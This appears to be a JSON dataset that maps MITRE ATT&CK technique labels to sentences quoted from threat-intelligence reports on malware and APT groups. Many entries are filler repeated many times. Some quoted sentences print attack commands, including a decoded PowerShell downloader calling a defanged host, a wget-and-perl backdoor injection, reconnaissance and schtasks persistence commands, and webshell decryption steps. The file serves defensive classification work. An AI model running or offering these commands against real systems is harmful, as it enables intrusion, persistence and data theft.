        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python",
        " Python"
    ],
    "permission groups discovery account discovery-multi": {
        "technique_names": [
            "permission groups discovery",
            "account discovery"
        ],
        "sentances": [
            "The data dump included the 0000000000.bat file, which when executed on an infected system would run the following commands to gather information to be sent back to the C2 server:  whoami hostname ipconfig /all net user /domain net group /domain net group \u201cdomain admins\u201d /domain net group \u201cExchange Trusted Subsystem\u201d /domain net accounts /domain net user net localgroup administrators netstat -an tasklist systeminfo reg query \u201cHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u201d schtasks /query /FO List /TN \u201cGoogleUpdatesTaskMachineUI\u201d /V | findstr /b /n /c:\u201dRepeat: Every:\u201d WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List  This batch script is also interesting as it uses echo commands to include headers before each of the command results",
            "It has the following command line argument help: info\u00a0 <Server/Domain> [options] [options]: \u00a0 -d Domain \u00a0 -o OsInfo \u00a0 -t TsInfo \u00a0 -n NetuseInfo \u00a0 -s ShareInfo ShareDir \u00a0 -c Connect Test \u00a0 -a Local And Global Group User Info \u00a0 -l Local Group User Info \u00a0 -g Global Group User Info \u00a0 -ga Group Administrators \u00a0 -gp Group Power Users \u00a0 -gd Group Domain Admins \u00a0 -f <infile> //input server list from infile, OneServerOneLine info <\\\\server> <user> ChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser"
        ]
    },
    "standard application layer protocol scripting-multi": {
        "technique_names": [
            "standard application layer protocol",
            "scripting"
        ],
        "sentances": [
            "The following HTTP request from the Helminth backdoor (SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c) downloaded the similar batch script: GET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1 Host: update-kernal[.]net Connection: Keep-Alive We performed a code comparison to visualize the similarities between the batch script delivered as the default command in Poison Frog is to the script provided to the Helminth backdoor",
            "The URL used can be found in the embedded OLE object:hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]Here is the source code of the downloaded HTA document:<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" /><title>Bonjour</title><script language=\"VBScript\">Set owFrClN0giJ = CreateObject(\"Wscript.Shell\")Set v1ymUkaljYF = CreateObject(\"Scripting.FileSystemObject\")If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") ThenowFrClN0giJ.Run \"powershell -nop -windowstyle hidden -executionpolicy bypass -encodedcommand JABjAD0AbgBlAHcALQBvA[...redacted...]H0AIAA=\" ,0owFrClN0giJ.Run \"cmd /c echo hta>%tmp%\\webbrowser1094826604.tmp\", 0End IfSelf.Close</script><hta:applicationid=\"oHTA\"applicationname=\"Bonjour\"application=\"yes\"></head></html>Once decoded using the base64 algorithm, we are able to read the final payload:$c=new-object System.Net.WebClient$t =$env:temp$t1=$t+\"\\\\alitmp0131.jpg\"$t2=$t+\"\\\\alitmp0132.jpg\"$t3=$t+\"\\\\alitmp0133.js\"try  {    echo $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg\",$t1)    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg\",$t2)    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp\",$t3)    wscript.exe $t3  }catch  {   }The purpose of this script is to download and execute a Windows script and two encoded payloads",
            "The assembly code used to create the shellcode can be obtained from: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to the URL \u201chxxp://45.76.128[.]165:4443/0w0O6\u201d"
        ]
    },
    "custom cryptographic protocol deobfuscate/decode files or information obfuscated files or information pass the hash data encoding-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "deobfuscate/decode files or information",
            "obfuscated files or information",
            "pass the hash",
            "data encoding"
        ],
        "sentances": [
            "We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell:  Append a string to the password that acts as a salt Obtain the SHA1 hash of the resulting string containing the password and salt Base64 encode the SHA1 hash Compare the encoded hash with hardcoded base64 string If the encoded hash matches hardcoded base64 string then the inbound request is authenticated Generates the SHA256 hash of the password string Base64 encodes the SHA256 hash and uses the first 24 characters as a key Uses 24-character key and the 3DES cipher to decrypt the embedded webshell  Now let\u2019s look at how this works with the values in the TwoFace++ loader sample"
        ]
    },
    "system owner/user discovery system network configuration discovery account discovery user execution-multi": {
        "technique_names": [
            "system owner/user discovery",
            "system network configuration discovery",
            "account discovery",
            "user execution"
        ],
        "sentances": [
            "The webshell will iterate through the IP list and perform a series of commands for each IP, starting off with using the following command to connect to the remote system: net use [IP address] /user:[domain admin username] [domain admin password] 2>&1 After connecting to the remote system with net use, the webshell will run the following command to obtain a list of user folders: dir /b [IP address]\\c$\\Users 2>&1 With a list of user folders, the webshell will iterate through the list of users and enumerate all of the files in the following folders: [IP address]\\c$\\Users\\[username]\\Desktop [IP address]\\c$\\Users\\[username]\\Documents [IP address]\\c$\\Users\\[username]\\Downloads The Network Downloader function will gather all the files in these folders and use 7-Zip to compress and archive the files"
        ]
    },
    "screen capture": [
        "Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group",
        "Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20",
        "Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018",
        "This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH",
        "The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible",
        "Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands",
        "Can capture all screen (\u201cAllScreen\u201d) or the active window (\u201cActiveWindow\u201d)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
        "The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group\u2019s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences",
        "SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path \u201c/FeedBack.php\u201d",
        "While sending to the C2 server, the data is formatted as follows: @{SYSINFO\u00a0 = $get.ToString(); ACTION = \"REGISTER\";}  Ability to take screenshots",
        "The \u201cscreenshot\u201d command takes a screenshot that is saved as a.PNG file in \u201cProgramData\u201c",
        "The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path",
        "Figure 3: Screen capture of\u00a0the downloader executed on OS X El Capitan",
        "Interestingly, we\u2019ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers",
        "The C2 server can also send a PowerShell command to capture and store a screenshot of a victim\u2019s system",
        "POWRUNER will send the captured screenshot image file to the C2 server if the \u201cfileupload\u201d command is issued",
        "The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string \u2018$screenshot\u2019",
        "23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2",
        "Periodic low resolution screenshots",
        "SpyNote RAT captured the device\u2019s screen activities along with audio using the \u00a0MediaProjectionCallback\u00a0functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following\u00a0screenshot:          Figure 5\u00a0:\u00a0Output\u00a0File     SMS stealing\u00a0 SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot\u00a0below:          Figure 6:\u00a0Reading SMS\u00a0messages     Stealing\u00a0contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the\u00a0spyware",
        "[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I\u2019d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future",
        "Returns the screenshot to the C2 via: <img src=\u2019data:image/jpeg;base64,[base64 of screenshot]\u2019 width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot",
        "capture screenshot"
    ],
    "screen capture remote desktop protocol web shell-multi": {
        "technique_names": [
            "screen capture",
            "remote desktop protocol",
            "web shell"
        ],
        "sentances": [
            "The screenshots included remote desktop (RDP) sessions showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow, web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers"
        ]
    },
    "indicator removal on host": [
        "It also deletes Windows Event Logs : Application, Security, Setup, System",
        "This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine",
        "This is a guest post by independent security researcher James Quinn.\u00a0This will be Part 1 of a series titled Reversing Gh0stRAT Variants.\u00a0 As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.\u00a0 Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1\u2019s.\u00a0 Of these samples, there was one specific sample that stood out to me.\u00a0 A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from \u201cGh0st\u201d to \u201cnbLGX\u201d, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.\u00a0 Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs"
    ],
    "disabling security tools masquerading-multi": {
        "technique_names": [
            "disabling security tools",
            "masquerading"
        ],
        "sentances": [
            "Once activated, this variant of the KillDisk component looks for and terminates two non-standard processes with the following names:  komut.exe sec_service.exe  We didn\u2019t manage to find any information regarding the name of the first process (komut.exe)"
        ]
    },
    "masquerading remote services-multi": {
        "technique_names": [
            "masquerading",
            "remote services"
        ],
        "sentances": [
            "During our investigation of one of the compromised servers we found an application that, at first glance, appeared to be a legitimate SSH server called Dropbear SSH"
        ]
    },
    "input capture": [
        "The same situation applies to authentication by key pair \u2013 the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used",
        "As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister",
        "The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx",
        "The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs",
        "NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers",
        "Example of decoded keylogger output",
        "It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems",
        "Deobfuscated, we can see it is the HawkEye Keylogger \u2014 Reborn v9, Version=9.0.1.6",
        "8 Upload the TPX498.dat file, which contains the list of collected keystrokes",
        "63 64 ku64.dll ku32.dll Keylogger & clipboard monitor",
        "keylogger) may be missing for these platforms",
        "However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively",
        "There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware",
        "XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality",
        "Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them",
        "This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes",
        "LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window\u2019s temp folder.",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        "keylog ",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes",
        " capture keystrokes"
    ],
    "scripting obfuscated files or information remote file copy-multi": {
        "technique_names": [
            "scripting",
            "obfuscated files or information",
            "remote file copy"
        ],
        "sentances": [
            "The first stage shellcode contains an interesting NOP sled with alternative instructions, which was most likely designed in such a way to avoid detection by antivirus products looking for large NOP blocks inside flash files: NOP sled composed of 0x90 and 0x91 opcodes The main purpose of the initial shellcode is to download second stage shellcode from hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf"
        ]
    },
    "process hollowing scripting remote file copy-multi": {
        "technique_names": [
            "process hollowing",
            "scripting",
            "remote file copy"
        ],
        "sentances": [
            "Second stage shellcode The second stage shellcode will then perform the following actions:  Download the final payload (FinSpy) from hxxp://89.45.67[.]107/rss/mo.exe Download a lure document to display to the victim from the same IP Execute the payload and display the lure document  Payload \u2013 mo.exe As mentioned earlier, the \u201cmo.exe\u201d payload (MD5: 4a49135d2ecc07085a8b7c5925a36c0a) is the newest version of Gamma International\u2019s FinSpy malware, typically sold to nation states and other law enforcement agencies to use in lawful surveillance operations.\u00a0 This newer variant has made it especially difficult for researchers to analyze the malware due to many added anti-analysis techniques, to include a custom packer and virtual machine to execute code"
        ]
    },
    "deobfuscate/decode files or information binary padding software packing virtualization/sandbox evasion-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "binary padding",
            "software packing",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "Part of packed VM PCODE After unpacking, the PCODE it will look like the following: Unpacked PCODE After unpacking the virtual machine PCODE is then decrypted: Decrypted VM PCODE The custom virtual machine supports a total of 34 instructions: Example of parsed PCODE In this example, the \u201c1b\u201d instruction is responsible for executing native code that is specified in parameter field"
        ]
    },
    "process injection dll search order hijacking dll side-loading-multi": {
        "technique_names": [
            "process injection",
            "dll search order hijacking",
            "dll side-loading"
        ],
        "sentances": [
            "Once the payload is successfully executed, it will proceed to copy files to the following locations:  C:\\ProgramData\\ManagerApp\\AdapterTroubleshooter.exe C:\\ProgramData\\ManagerApp\\15b937.cab C:\\ProgramData\\ManagerApp\\install.cab C:\\ProgramData\\ManagerApp\\msvcr90.dll C:\\ProgramData\\ManagerApp\\d3d9.dll  The \u201cAdapterTroubleshooter.exe\u201d file is a legitimate binary which is leveraged to use the famous DLL search order hijacking technique.\u00a0 The \u201cd3d9.dll\u201d file is malicious and is loaded into memory by the legit binary upon execution.\u00a0 Once loaded, the DLL will then inject FinSpy into the Winlogon process",
            "APIs from the following libraries are loaded at runtime:  Kernel32.dll Ws2_32/wsock32.dll Apvapi32.dll Oleaut32.dll Iphlp.dll Urlmon.dll  A dynamic API loaded by the malware",
            "13 14 ams_api64.dll ams_api32.dll Handy wrapper around API of exXX.dll, pdXX.dll, sgXX.dll"
        ]
    },
    "dll side-loading": [
        "(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
        "Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks \u00a0 Superficially, we can immediately see the images are quite similar, but with some glaring differences",
        "The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past",
        "DLL side loading is often used to maintain persistence on the compromised system",
        "DLL side loading has been used to maintain persistence on the compromised system",
        "Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ \u2014 Tomcat web application manager GET /jmx-console/ \u2014 JBoss configuration GET /CFIDE/administrator/login.cfm \u2014 ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
        "Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors",
        "As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value"
    ],
    "disabling security tools file deletion-multi": {
        "technique_names": [
            "disabling security tools",
            "file deletion"
        ],
        "sentances": [
            "In 2016, CTU researchers observed the group using native system functionality to disable logging processes and delete logs within a compromised environment",
            "Threat actor using appcmd to delete logs and disable logging"
        ]
    },
    "data staged web shell data encoding-multi": {
        "technique_names": [
            "data staged",
            "web shell",
            "data encoding"
        ],
        "sentances": [
            "Exfiltration BRONZE UNION has also leveraged various web shells to collect and stage data for exfiltration"
        ]
    },
    "file deletion data staged-multi": {
        "technique_names": [
            "file deletion",
            "data staged"
        ],
        "sentances": [
            "In the following example, archives for exfiltration were renamed as .tmp files:  move \\\\{FILE PATH}\\c$\\programdata\\AT.part01.rar  \\\\{FILE PATH}\\c$\\programdata\\at01.tmp The TMP files were then staged for exfiltration on Internet-facing servers that had previously been compromised with the China Chopper web shell",
            "!ExeCuteFile Executes a specified file using ShellExecuteA   !DeleteFileFolder Deletes a file or a folder   !SendkeyLogToServer Uploads the %TEMP%\\Save.tmp file to the C2 server   !DeleteKeyloggerLog Deletes the %TEMP%\\Save.tmp file on the system    Table 2 Commands available within MPK IRC Bot \u00a0 The post Magic Hound Campaign Attacks Saudi Targets appeared first on Palo Alto Networks Blog",
            "Serving the backdoor  Another HTTP request is sent to the targeted server, with the following resource: /?module=wget hxxp://67[.]209.177.163/ibus -O /tmp/e3ac24a0bcddfacd010a6c10f4a814bc The above standard injection pulls the ibus payload and stores it on /tmp/e3ac24a0bcddfacd010a6c10f4a814bc  Launching the backdoor  The execution is issued using an additional HTTP request: /?module=perl /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc;sleep 2;rm -rf /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc That executes the perl script, puts it to sleep for two seconds and deletes the file to remove any evidence"
        ]
    },
    "file deletion web shell-multi": {
        "technique_names": [
            "file deletion",
            "web shell"
        ],
        "sentances": [
            "From those servers the threat actor could use a web shell to retrieve the encrypted archives:  copy \\\\{FILE PATH}\\c$\\programdata\\*.tmp \\\\{FILE PATH}\\ServiceDesk\\custom\\style After exfiltrating the files, the threat actor used web shell access on the staging server to delete the staged RAR archives and detach their network shares, likely to avoid detection"
        ]
    },
    "web shell windows admin shares-multi": {
        "technique_names": [
            "web shell",
            "windows admin shares"
        ],
        "sentances": [
            "Advanced endpoint threat detection (AETD) can help detect activity associated with web shells and lateral movement, and network technologies that use sandboxing techniques to detonate binaries in network traffic can prevent malicious traffic from reaching internal systems"
        ]
    },
    "timestomp scheduled task binary padding remote services system network configuration discovery indicator removal on host web service brute force dll side-loading web shell pass the hash drive-by compromise-multi": {
        "technique_names": [
            "timestomp",
            "scheduled task",
            "binary padding",
            "remote services",
            "system network configuration discovery",
            "indicator removal on host",
            "web service",
            "brute force",
            "dll side-loading",
            "web shell",
            "pass the hash",
            "drive-by compromise",
            "tor"
        ],
        "sentances": [
            "Indicator   Type   Context       198.56.185.179   IP address   Used by BRONZE UNION to connect to China Chopper web shell     211.255.155.194   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.199   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.202   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.204   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.215   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.218   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.219   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.224   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     104.130.244.126   IP address   Used by BRONZE UNION to connect to web shells     96.90.63.57   IP address   Used by BRONZE UNION to connect to web shells     117.136.63.145   IP address   Used by BRONZE UNION to connect to web shells     cd5aaa37ee165071f914ceec8fd09e0f   MD5 hash   OwaAuth web shell used by BRONZE UNION     2b5aa30f8f0575bdfe1ddebc8dac8c56a91137a8   SHA1 hash   OwaAuth web shell used by BRONZE UNION     0e823a5b64ee761b70315548d484b5b9c4b61968b5068f9a8687c612ddbfeb80   SHA256 hash   OwaAuth web shell used by BRONZE UNION     javaws.exe   Filename   Malware used in BRONZE UNION SWC that downloads and executes a second-stage payload     98c5f2a680fe9de19683120be90ea75c   MD5 hash   Malware used in BRONZE UNION SWC (javaws.exe)F     daa03d4aa72a16fff910142982b057b195018e6d   SHA1 hash   Malware used in BRONZE UNION SWC (javaws.exe)     ec60e57419f24fabbe67451cb1055b3d2684ab2534cd55c4a88cc395f9ed1b09   SHA256 hash   Malware used in BRONZE UNION SWC (javaws.exe)     45.114.9.174   IP address   Used by BRONZE UNION to host second-stage payload for SWC     Table 1"
        ]
    },
    "security software discovery data from local system deobfuscate/decode files or information file deletion file and directory discovery exfiltration over command and control channel data compressed uncommonly used port access token manipulation fallback channels-multi": {
        "technique_names": [
            "security software discovery",
            "data from local system",
            "deobfuscate/decode files or information",
            "file deletion",
            "file and directory discovery",
            "exfiltration over command and control channel",
            "data compressed",
            "uncommonly used port",
            "access token manipulation",
            "fallback channels",
            "commonly used port",
            "tor"
        ],
        "sentances": [
            "Symantec and Norton products offer the following detections: Antivirus  Backdoor.Pirpi Backdoor.Pirpi!dr Backdoor.Pirpi!gen1 Backdoor.Pirpi!gen2 Backdoor.Pirpi!gen3 Backdoor.Pirpi!gen4 Backdoor.Pirpi.A Backdoor.Pirpi.B Backdoor.Pirpi.C Backdoor.Pirpi.D Downloader.Pirpi Downloader.Pirpi!g1  Intrusion prevention system  System Infected: Backdoor.Pirpi Activity 3  Update\u2013September 14, 2016: Indicators of compromise We have compiled a list of indicators of compromise for the campaigns described in this blog"
        ]
    },
    "scheduled task registry run keys / startup folder-multi": {
        "technique_names": [
            "scheduled task",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "The malware utilizes several persistence mechanisms including scheduled tasks, Userinit and Run registry keys in the HKLM hive",
            "Persistence Mechanism Figure 3 shows that for persistence, the document creates two scheduled tasks and creates one auto-start registry entry pointing to the LNK file"
        ]
    },
    "standard application layer protocol data encoding-multi": {
        "technique_names": [
            "standard application layer protocol",
            "data encoding"
        ],
        "sentances": [
            "For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP"
        ]
    },
    "disabling security tools file and directory discovery-multi": {
        "technique_names": [
            "disabling security tools",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "Remexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions"
        ]
    },
    "scheduled task": [
        "Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry",
        "For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\"<event_cache_dir_path>t /F\"     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager",
        "In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task",
        "After execution of every task, the malware sleeps for one minute before executing the next task",
        "The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server",
        "With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently",
        "The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN \u201c%n%\u201d /TR \u201cwscript %path%\u201d /f The decoded string from the VBS resource is: CreateObject(\u201cWScript.Shell\u201d).Run(\u201c%app%\u201d) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin",
        "This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task",
        "This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution",
        "After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server",
        "A scheduled task is also generated to maintain persistence of the payload",
        "Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host",
        "The malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami\u201d to verify it is running with the elevated privileges of \u201cSystem\u201d and creates persistence by creating the following scheduled task: \u00a0\u00a0\u00a0 schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON \u00a0\u00a0\u00a0 /ru \"System\" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913",
        "The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems",
        "This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot",
        "They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX",
        "Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)",
        "The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT",
        "Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (\u201cMSOFFICEER\u201d) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes",
        "The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute.",
        "When the trojan starts up it will attempt to install a scheduled task with the name of \u201cJava Maintenance64\u201d to keep itself running.",
        "The campaigns maintain persistence on machines by creating two daily scheduled task entries.",
        "The script writes files to the path % appdata %\\Roaming\\Microsoft\\Templates\\, then creates two task entries triggered to run daily.",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
        " scheduled task",
